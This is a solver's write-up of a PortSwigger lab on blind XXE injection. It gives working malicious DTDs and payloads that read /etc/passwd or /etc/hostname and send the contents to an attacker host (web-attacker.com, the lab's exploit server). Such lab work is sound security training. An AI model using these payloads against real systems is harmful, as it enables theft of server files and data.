# Exploiting blind XXE to exfiltrate data using a malicious external DTD

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

## Definition
Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

- Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.
- Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
- Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
- Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL: `http://web-attacker.com/malicious.dtd`

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server. 

## Notes
This lab has a `Check stock` feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file. 

**Remote Host**  
- [Portsweeger lab with an exploit server](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
- [Remote URL](https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit)
- [Fake burpcollaborator URL](https://abc1234def.burpcollaborator.net)

**Original Request** 
```http
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>4</productId><storeId>2</storeId></stockCheck>
```
## Option 1
Declaring and executing the malicious entity from the `external DTD`, and importing it from the `internal DTD` of the main XML.

**Malicious External DTD**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrapper "<!ENTITY &#x25; pwn SYSTEM 'https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit/?x=%file;'>">
%wrapper;
%pwn;
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY % xxe SYSTEM
"https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit"> %xxe;]>
<stockCheck>
    <productId>4</productId>
    <storeId>2</storeId>
</stockCheck>
```

# Option 2
Declaring the malicious entity in the `external DTD` and calling it from the `internal DTD` of the main XML.

**Malicious External DTD**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrapper "<!ENTITY &#x25; pwn SYSTEM 'https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit/?x=%file;'>">
%wrapper;
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE vuln [<!ENTITY % xxe SYSTEM
"https://exploit-0a35000204f00ae7c0716b4e017f00d0.web-security-academy.net/exploit"> %xxe %pwn;]>
<stockCheck>
    <productId>4</productId>
    <storeId>2</storeId>
</stockCheck>
```

**Hostname**
`6b5271d39e6b`

**References**
[XML External Entities (XXE) Explained](https://www.youtube.com/watch?v=gjm6VHZa_8s)

[List of XML and HTML character entity references](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)

## Key Words
> xml, xxe, blind, entities, exfiltrate, remote server, external dtd, pwnfunction